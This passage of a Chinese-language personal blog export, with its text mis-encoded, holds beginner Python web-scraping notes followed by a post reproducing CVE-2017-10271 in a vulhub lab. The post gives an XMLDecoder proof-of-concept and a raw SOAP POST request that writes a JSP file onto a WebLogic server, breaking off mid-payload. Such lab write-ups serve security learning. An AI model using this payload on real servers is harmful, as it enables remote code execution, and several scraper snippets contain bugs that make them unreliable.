class="line"></span><br><span class="line">    <span class="comment"># å‘é€è¯·æ±‚è·å–å“åº” æˆåŠŸçŠ¶æ€ç ä¸º200</span></span><br><span class="line">    response = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="comment">#ä½¿ç”¨bså–è§£æç½‘é¡µ</span></span><br><span class="line">        bs = BeautifulSoup(response.content,<span class="string">"html5lib"</span>)</span><br><span class="line">        <span class="comment">#å®šä½åˆ°ç½‘é¡µä¸­å­˜æ”¾å›¾ç‰‡çš„DIV attrs é»˜è®¤é‡‡ç”¨çš„æ˜¯class</span></span><br><span class="line">        warp = bs.find(<span class="string">"div"</span>, attrs=&#123;<span class="string">"id"</span>: <span class="string">"container"</span>&#125;)</span><br><span class="line">        <span class="comment"># è·å–æˆ‘ä»¬çš„img  # éŸ³é¢‘  audio  src</span></span><br><span class="line">        imglist = warp.find_all(<span class="string">"img"</span>)</span><br><span class="line">        <span class="comment"># è·å–å›¾ç‰‡çš„åç§° --debugæ¥æ£€æŸ¥ä»£ç </span></span><br><span class="line">        <span class="keyword">for</span> img <span class="keyword">in</span> imglist:</span><br><span class="line">            title = img[<span class="string">"alt"</span>]</span><br><span class="line">            src = img[<span class="string">"src2"</span>]</span><br><span class="line">            <span class="comment">#éœ€è¦å†ä¸€æ¬¡å–è¯·æ±‚å›¾ç‰‡åœ°å€ å¹¶ä¸”å°†å›¾ç‰‡æ”¾å…¥æ–‡ä»¶å¤¹ä¸­</span></span><br><span class="line">            <span class="keyword">with</span> open(download+title+<span class="string">".jpg),"</span>w<span class="string">b")as file:</span></span><br><span class="line"><span class="string">                file.write(requests.get(src).content)</span></span><br><span class="line"><span class="string">        print("</span>ç¬¬%dé¡µæ‰“å°å®Œæˆ<span class="string">"%i)</span></span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="å®ä¾‹2-å•å¼ å°è¯´"><a href="#å®ä¾‹2-å•å¼ å°è¯´" class="headerlink" title="å®ä¾‹2 å•å¼ å°è¯´"></a>å®ä¾‹2 å•å¼ å°è¯´</h2><p><a href="https://www.cnblogs.com/simple-li/p/11253312.html" target="_blank" rel="noopener">åˆè¯†python ä¹‹ çˆ¬è™«ï¼šBeautifulSoup çš„ findã€find_allã€select æ–¹æ³•</a></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">download = <span class="string">"novel/"</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(download):</span><br><span class="line">    os.mkdir(download)</span><br><span class="line"><span class="comment"># å‘é€è¯·æ±‚è·å–å“åº”</span></span><br><span class="line">url = <span class="string">"https://www.biqukan.com/42_42882/14586139.html"</span></span><br><span class="line">reponse = requests.get(url)</span><br><span class="line"><span class="comment"># è§£æå“åº”å†…å®¹</span></span><br><span class="line"><span class="keyword">if</span> reponse.status_code == <span class="number">200</span>:</span><br><span class="line">    bs = BeautifulSoup(reponse.content,<span class="string">"html5lib"</span>)</span><br><span class="line">    <span class="comment"># è·å–æ ‡é¢˜</span></span><br><span class="line">    <span class="comment"># bs.find()</span></span><br><span class="line">    <span class="comment"># bs.findAll()</span></span><br><span class="line">    <span class="comment"># bs.find_all("div",attrs=&#123;"":""&#125;)</span></span><br><span class="line">    h1 = bs.select_one(<span class="string">"h1"</span>)</span><br><span class="line">    title = h1.text</span><br><span class="line">    <span class="comment"># æ‰¾å½“å‰æ–‡ç« çš„æ–‡æœ¬</span></span><br><span class="line">    showtxt = bs.select_one(<span class="string">".showtxt"</span>).text</span><br><span class="line">    <span class="comment"># å¯¹æ–‡æœ¬è¿›è¡Œæ“ä½œ æƒ³å»æ‰ä¸éœ€è¦çš„ä¸œè¥¿(å­—ç¬¦ä¸²ç±»å‹)---replace</span></span><br><span class="line">    res = showtxt.replace(<span class="string">"app2();"</span>,<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">with</span> open(download+title+<span class="string">".txt"</span>,<span class="string">"w"</span>,encoding=<span class="string">"utf-8"</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(res)</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="å®ä¾‹3-æ•´æœ¬å°è¯´"><a href="#å®ä¾‹3-æ•´æœ¬å°è¯´" class="headerlink" title="å®ä¾‹3 æ•´æœ¬å°è¯´"></a>å®ä¾‹3 æ•´æœ¬å°è¯´</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">header=&#123;<span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36'</span>&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">"https://www.biqukan.com/42_42882/"</span></span><br><span class="line">response = requests.get(url, header=header)</span><br><span class="line">response.encoding=<span class="string">'utf-8'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">    bs = BeautifulSoup(response.content,<span class="string">"html5lib"</span>)</span><br><span class="line">    title = bs.select_one(<span class="string">"h2"</span>).text+<span class="string">"/"</span></span><br><span class="line">    <span class="comment"># åœ¨è¿›è¡Œåˆ°æˆ‘ä»¬çˆ¬å–æ ‡é¢˜çš„æ—¶å€™åˆ›å»ºä»¥æ ‡é¢˜å‘½åçš„æ–‡ä»¶å¤¹</span></span><br><span class="line">    <span class="comment"># æ–‡ä»¶ä¸‹è½½è·¯å¾„ = "xxx/" </span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(title):</span><br><span class="line">        os.mkdir(title)</span><br><span class="line">    <span class="comment"># æ‰¾æˆ‘ä»¬çš„divæ ‡ç­¾</span></span><br><span class="line">    listman = bs.select_one(<span class="string">".listmain"</span>)</span><br><span class="line">    <span class="comment"># æ‰¾åˆ°æ‰€æœ‰çš„aæ ‡ç­¾</span></span><br><span class="line">    alist = listman.select(<span class="string">"a"</span>)</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> alist:</span><br><span class="line">        aTitle = a.text</span><br><span class="line">        href = a[<span class="string">"href"</span>].split(<span class="string">"/"</span>)[<span class="number">-1</span>]</span><br><span class="line">        <span class="comment"># print(aTitle,href)</span></span><br><span class="line">        <span class="comment"># å†ä¸€æ¬¡è¯·æ±‚è¿›å…¥ä¸‰çº§åŸŸå</span></span><br><span class="line">        urlChild = url+href</span><br><span class="line">        responseChild = requests.get(urlChild)</span><br><span class="line">        <span class="keyword">if</span> responseChild.status_code == <span class="number">200</span>:</span><br><span class="line">           bsChild = BeautifulSoup(responseChild.content,<span class="string">"html5lib"</span>)</span><br><span class="line">           <span class="comment"># æ‰¾å½“å‰æ–‡ç« çš„æ–‡æœ¬ type(showtxt) (str)</span></span><br><span class="line">           showtxt = bsChild.select_one(<span class="string">".showtxt"</span>).text</span><br><span class="line">           <span class="comment"># å¯¹æ–‡æœ¬è¿›è¡Œæ“ä½œ å»æ‰ä¸æƒ³è¦çš„ replace</span></span><br><span class="line">           res = showtxt.replace(<span class="string">"app2();"</span>, <span class="string">""</span>)</span><br><span class="line">           <span class="keyword">with</span> open(title + aTitle + <span class="string">".txt"</span>, <span class="string">"w"</span>, encoding=<span class="string">"utf-8"</span>) <span class="keyword">as</span> file:</span><br><span class="line">               file.write(res)</span><br></pre></td></tr></table></figure></div>

<h1 id="çˆ¬è™«å­¦ä¹ 2"><a href="#çˆ¬è™«å­¦ä¹ 2" class="headerlink" title="çˆ¬è™«å­¦ä¹ 2"></a>çˆ¬è™«å­¦ä¹ 2</h1><p>è‡ªå·±ä¹Ÿä¸çŸ¥é“è¿™å‡ å¤©æ€ä¹ˆè¿‡æ¥çš„ï¼Œåæ­£è¯´å­¦åˆ°å¤šå°‘ï¼Œä¹Ÿæ²¡å¤šå°‘ï¼Œè¯´æ²¡å­¦ï¼Œè¿™ä¸¤å‘¨æ¯å¤©ä¸€æ•´ä¸ªä¸‹åˆéƒ½åœ¨å­¦è¿™ä¸ªã€‚</p>
<h2 id="çˆ¬éŸ³é¢‘"><a href="#çˆ¬éŸ³é¢‘" class="headerlink" title="çˆ¬éŸ³é¢‘"></a>çˆ¬éŸ³é¢‘</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">download = <span class="string">"music/"</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(download):</span><br><span class="line">    os.mkdir(download)</span><br><span class="line"></span><br><span class="line">url = <span class="string">"https://www.i4.cn/ring_22_0_1.html"</span></span><br><span class="line">response = requests.get(url)</span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">    bs = BeautifulSoup(response.content, <span class="string">"html5lib"</span>)</span><br><span class="line">    <span class="comment"># å¯»æ‰¾å­˜æ”¾éŸ³ä¹çš„ div find ç±»ä¼¼</span></span><br><span class="line">    kbox = bs.select(<span class="string">".kbox"</span>)</span><br><span class="line">    <span class="comment"># æ‰¾ ring_list</span></span><br><span class="line">    ring = kbox.select(<span class="string">".ring_list"</span>)</span><br><span class="line">    <span class="keyword">for</span> li <span class="keyword">in</span> ring:</span><br><span class="line">        title = li.select(<span class="string">".title"</span>).text</span><br><span class="line">        <span class="comment"># title = li.select(".title")["title"]</span></span><br><span class="line">        <span class="comment"># print(title)</span></span><br><span class="line">        src = li.select(<span class="string">".audio_play"</span>)[<span class="string">"data-mp3"</span>]</span><br><span class="line">        <span class="keyword">with</span> open(download + title + <span class="string">".mp3"</span>, <span class="string">"wb"</span>) <span class="keyword">as</span> file:</span><br><span class="line">            r = requests.get(src)</span><br><span class="line">            file.write(r.content)</span><br></pre></td></tr></table></figure></div>

<p>åªæ˜¯å¼•ç”¨çš„åŒ…ä¸åŒï¼Œæ‰€ä»¥å­˜åœ¨ä¸€äº›å†™æ³•ä¸åŒ</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.request <span class="keyword">as</span> request</span><br><span class="line"></span><br><span class="line">download = <span class="string">"music/"</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(download):</span><br><span class="line">    mkdir(download)</span><br><span class="line"></span><br><span class="line">url=<span class="string">"https://www.i4.cn/ring_22_0_1.html"</span></span><br><span class="line"></span><br><span class="line">response = request.urlopen(url)</span><br><span class="line"><span class="comment"># print(response) äºŒè¿›åˆ¶è¯»å–</span></span><br><span class="line"></span><br><span class="line">bs = BeautifulSoup(response.content, <span class="string">"html5lib"</span>)</span><br><span class="line">    <span class="comment"># å¯»æ‰¾å­˜æ”¾éŸ³ä¹çš„ div find ç±»ä¼¼</span></span><br><span class="line">    kbox = bs.select(<span class="string">".kbox"</span>)</span><br><span class="line">    <span class="comment"># æ‰¾ ring_list</span></span><br><span class="line">    ring = kbox.select(<span class="string">".ring_list"</span>)</span><br><span class="line">    <span class="keyword">for</span> li <span class="keyword">in</span> ring:</span><br><span class="line">        title = li.select(<span class="string">".title"</span>).text</span><br><span class="line">      src = li.select(<span class="string">".audio_play"</span>)[<span class="string">"data-mp3"</span>]</span><br><span class="line">        request.urlretrieve(src, download + title +<span class="string">".mp3"</span>)</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="çˆ¬è±†ç“£çš„è¯„è®ºï¼Œå¸–å­"><a href="#çˆ¬è±†ç“£çš„è¯„è®ºï¼Œå¸–å­" class="headerlink" title="çˆ¬è±†ç“£çš„è¯„è®ºï¼Œå¸–å­"></a>çˆ¬è±†ç“£çš„è¯„è®ºï¼Œå¸–å­</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">download = <span class="string">"comment/"</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(download):</span><br><span class="line">    os.mkdir(download)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯„ç”Ÿè™«</span></span><br><span class="line">url=<span class="string">"https://movie.douban.com/subject/27010768/"</span></span><br><span class="line"></span><br><span class="line">req = urllib.request.Request(url=url, headers=header, method=<span class="string">'GET'</span>)</span><br><span class="line"><span class="keyword">print</span> (req)</span><br><span class="line">response = urllib.request.urlopen(req)</span><br><span class="line"><span class="comment"># print(response.read()) # äºŒè¿›åˆ¶è¯»å–</span></span><br><span class="line"></span><br><span class="line">bs = BeautifulSoup(response.read(), <span class="string">"html5lib"</span>)</span><br><span class="line">    <span class="comment"># å¯»æ‰¾è±†ç“£è¯„è®ºçš„div </span></span><br><span class="line">comments = bs.select_one(<span class="string">"#comments-section"</span>)</span><br><span class="line">    <span class="comment"># æ‰¾ å•ä¸ªè¯„è®º</span></span><br><span class="line">shortInfo = comments.select(<span class="string">".comment"</span>)</span><br><span class="line"><span class="comment"># åˆ›å»ºä¸€ä¸ªlist åˆ—è¡¨ å­˜æ”¾æ•°æ®</span></span><br><span class="line">comlist = []</span><br><span class="line"><span class="keyword">for</span> li <span class="keyword">in</span> shortInfo:</span><br><span class="line">    info = li.select_one(<span class="string">".comment-info"</span>)</span><br><span class="line">    <span class="comment"># è¯„è®ºäºº</span></span><br><span class="line">    name = info.select_one(<span class="string">"a"</span>).text</span><br><span class="line">    <span class="comment"># è¯„è®ºä¿¡æ¯</span></span><br><span class="line">    shortcom = li.select_one(<span class="string">".short"</span>).text</span><br><span class="line">    <span class="comment"># å°†æ•°æ®å†™å…¥ csv æ–‡ä»¶ </span></span><br><span class="line">    <span class="comment"># å°†æ•°æ®è½¬ä¸º å­—å…¸</span></span><br><span class="line">    commentText = &#123;<span class="string">"name"</span>:name, <span class="string">"comment-info"</span>:shortcom&#125;</span><br><span class="line">    comlist.append(commentText)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"å¯„ç”Ÿè™«.csv"</span>, <span class="string">"w"</span>, newline=<span class="string">""</span>, encoding=<span class="string">"utf-8"</span>) <span class="keyword">as</span> file:</span><br><span class="line">    csvWr = csv.writer(file)</span><br><span class="line">    <span class="keyword">for</span> Scom <span class="keyword">in</span> comlist:</span><br><span class="line">        csvWr.writerow([Scom[<span class="string">"name"</span>], Scom[<span class="string">"comment-info"</span>]])</span><br><span class="line">        <span class="comment"># csvWr.writerows([Scom["name"], Scom["comment-info"]])</span></span><br><span class="line">        <span class="comment"># å¤šæ‰“s ä¼šé€ æˆæ¯ä¸ªå­—ç¬¦éƒ½å˜æˆä¸€ä¸ªå•å…ƒæ ¼å±æ€§</span></span><br></pre></td></tr></table></figure></div>

<p>è¿™è¾¹æœ€åé‚£é‡Œè¿˜æ˜¯å¯ä»¥æ³¨æ„ä¸€ä¸‹ï¼Œä¸€äº›ç»†èŠ‚é—®é¢˜ï¼Œä¼šå¯¼è‡´æœ€åçš„ç»“æœå‡ºç°åå·®</p>
<hr>
<h2 id="çˆ¬è§†é¢‘"><a href="#çˆ¬è§†é¢‘" class="headerlink" title="çˆ¬è§†é¢‘"></a>çˆ¬è§†é¢‘</h2><p>é¦–å…ˆè¦å»ä¸‹è½½ä¸€ä¸ª <code>ffmpeg</code> ï¼Œè¿™ä¸ªä¸œè¥¿å¯ä»¥æŠŠè§†é¢‘æµæºçˆ¬ä¸‹æ¥</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://jx618g.com/?url="</span></span><br><span class="line">response = requests.get(url)</span><br><span class="line">bs = BeautifulSoup(response.content, <span class="string">"html5lib"</span>)</span><br><span class="line">print(bs)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰¾åˆ° src m3u8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># cmd: ffmpeg -i m3u8åœ°å€ -vcodec copy -acodec copy xxx.mp4</span></span><br></pre></td></tr></table></figure></div>

<hr>
<h1 id="æ—¥å¸¸çæ‰¯ä¸€ä¼š"><a href="#æ—¥å¸¸çæ‰¯ä¸€ä¼š" class="headerlink" title="æ—¥å¸¸çæ‰¯ä¸€ä¼š"></a>æ—¥å¸¸çæ‰¯ä¸€ä¼š</h1><p>éš¾å¾—æœ‰æ—¶é—´é€¼é€¼ä¸¤å¥ï¼Œæœ¬æ¥æ‰“ç®—æ‰¾ä¸ªå¥½ç‚¹çš„å›¾åºŠï¼Œæ¯•ç«Ÿä¸€ç›´ç™½å«–å¾®åšå¥½åƒä¹Ÿä¸å¤ªå¥½ï¼Œå¯æ˜¯å‘ç°æ²¡å‡ ä¸ªå¥½çš„ï¼Œæƒ³äº†ä¸‹ï¼Œç­‰è¿‡æ®µæ—¶é—´ <code>coding</code> é‚£è¾¹å‡çº§ç»“æŸåï¼Œå†æŠŠè‡ªå·±çš„blog æ¬è¿‡å»ä¸€ä»½å¥½äº†ï¼Œç½‘ç«™å¤‡æ¡ˆè¿˜åœ¨è€ƒè™‘ä¸­ï¼Œå®åœ¨ä¸è¡Œä»¥åå°±è‡ªå·±æŠŠè¿™äº›å…¨ä¸€è‚¡è„‘æ‰” <code>one note</code> ç®—äº†ï¼Œåæ­£ç«™å°ï¼Œä¸€å¹´å‡ ç™¾å—çš„cdn æƒ³äº†ä¸‹å¥½åƒä¹Ÿæ²¡é‚£ä¹ˆå¿…è¦å‡ºè¿™ä¸ªé’±ï¼Œç­‰ä»¥åè‡ªå·±èƒ½æˆå¤§ä½¬äº†ï¼Œç«™æµé‡å¤§äº†å†è¯´å§ã€‚</p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>çæ‰¯</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2017-10271æ¼æ´å­¦ä¹ </title>
    <url>/yakko117/2020/02/16/cve_2017_10271/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>Weblogicæ˜¯oracleæ¨å‡ºçš„application serverï¼Œç”±äºå…¶å…·æœ‰æ”¯æŒEJBã€JSPã€JMSã€XMLç­‰å¤šç§è¯­è¨€ã€å¯æ‰©å±•æ€§ã€å¿«é€Ÿå¼€å‘ç­‰å¤šç§ç‰¹æ€§ï¼Œå¤‡å—å¹¿å¤§ç³»ç»Ÿç®¡ç†å‘˜çš„é’çã€‚æ ¹æ®ä¸å®Œå…¨ç»Ÿè®¡weblogicçº¦å å…¨çƒå¸‚åœºä»½é¢1/3ï¼Œæ­£å› ä¸ºè¿™ä¹ˆé«˜çš„å æœ‰ç‡ï¼Œä¹Ÿé€ æˆæ¯æ¬¡weblogicæœ‰æ–°çš„æ¼æ´ï¼Œéƒ½ä¼šåœ¨ä¸šå†…å¼•èµ·è½©ç„¶å¤§æ³¢ã€‚åœ¨2017å¹´æ¥è¿‘å°¾å£°æ—¶ï¼Œweblogicåˆå†æ¬¡ç»™å¤§å®¶å¸¦æ¥äº†å·¨å¤§æƒŠå–œï¼ŒCVE-2017-10271æ¼æ´åˆä¸€æ¬¡å¸­å·äº†æ”¿åºœã€é“¶è¡Œç­‰å„å¤§è¡Œä¸šã€‚</p>
<a id="more"></a>

<h1 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h1><p><code>CVE-2017-10271</code>æ¼æ´ä¸»è¦æ˜¯ç”±<code>WebLogic Server WLS</code>ç»„ä»¶è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´<br>ç”± <code>wls-wsat.war</code> è§¦å‘è¯¥æ¼æ´ï¼Œè§¦å‘æ¼æ´urlå¦‚ä¸‹ï¼š<br><code>http://192.168.xx.xx:7001/wls-wsat/CoordinatorPortType</code><br>é€šè¿‡ postæ•°æ®åŒ…ï¼Œæ„é€  <code>SOAPï¼ˆXMLï¼‰</code> æ ¼å¼çš„è¯·æ±‚ï¼Œåœ¨è§£æçš„è¿‡ç¨‹ä¸­å¯¼è‡´ <code>XMLDecoderååºåˆ—åŒ–</code> æ¼æ´ï¼Œå¯¼è‡´å¯æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p>
<hr>
<h2 id="æµ‹è¯•è„šæœ¬"><a href="#æµ‹è¯•è„šæœ¬" class="headerlink" title="æµ‹è¯•è„šæœ¬"></a>æµ‹è¯•è„šæœ¬</h2><p>ç®€å•å¼¹ä¸ªè®¡ç®—å™¨ï¼Œåˆ›å»ºä¸ª <code>ts.xml</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">xml</div></div><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">"13.0.2"</span> <span class="attr">class</span>=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span> <span class="attr">length</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">string</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"start"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>ç„¶ååˆ©ç”¨ <code>Poc.java</code> ï¼Œå®ç°æ¼æ´å¤ç°</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> weblogic;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">XMLDecoderTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        java.io.File file = <span class="keyword">new</span> java.io.File(<span class="string">"pathname: xx/xx/xx/ts.xml"</span>);</span><br><span class="line"></span><br><span class="line">        java.beans.XMLDecoder xd = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            xd = <span class="keyword">new</span> java.beans.XMLDecoder(<span class="keyword">new</span> BufferedInputStream(<span class="keyword">new</span> FileInputStream(file)));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        Object s2 = xd.readObject();</span><br><span class="line">        xd.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbykv6u7thj30wy0jfk95.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbykv6u7thj30wy0jfk95.jpg" class="lazyload" title="test"></a></p>
<hr>
<h1 id="é¶æœºæµ‹è¯•"><a href="#é¶æœºæµ‹è¯•" class="headerlink" title="é¶æœºæµ‹è¯•"></a>é¶æœºæµ‹è¯•</h1><p>å› ä¸ºæ²¡æœ‰æ‰¾åˆ°è€ç‰ˆæœ¬çš„weblogicï¼Œåªå¥½ç”¨pç¥çš„vulhubæ¥å¤ç°æµ‹è¯•ä¸€ä¸‹</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbykv6qgl7j30mk0ehagp.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbykv6qgl7j30mk0ehagp.jpg" class="lazyload" title="test"></a></p>
<hr>
<h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><p>è®¿é—® <code>http://your-ip:7001/wls-wsat/CoordinatorPortType11</code> å­˜åœ¨ä¸‹é¢è¿™ç§æƒ…å†µ</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbykv6pj9qj30v208qdgg.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbykv6pj9qj30v208qdgg.jpg" class="lazyload" title="test"></a></p>
<p>ç„¶åå†™å…¥ <code>payload</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang"></div></div><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/wls-wsat/CoordinatorPortType</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: your-ip:7001</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,en-US;q=0.7,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Content-Type</span>: text/xml</span><br><span class="line"><span class="attribute">Content-Length</span>: 929</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;</span><br><span class="line">    &lt;soapenv:Header&gt;</span><br><span class="line">    &lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;</span><br><span class="line">    &lt;java&gt;&lt;java version="1.4.0" class="java.beans.XMLDecoder"&gt;</span><br><span class="line">    &lt;object class="java.io.PrintWriter"&gt; </span><br><span class="line">    &lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp&lt;/string&gt;&lt;void method="println"&gt;&lt;string&gt;&lt;![CDATA[</span><br><span class="line"></span><br><span class="line"> &lt;%</span><br><span 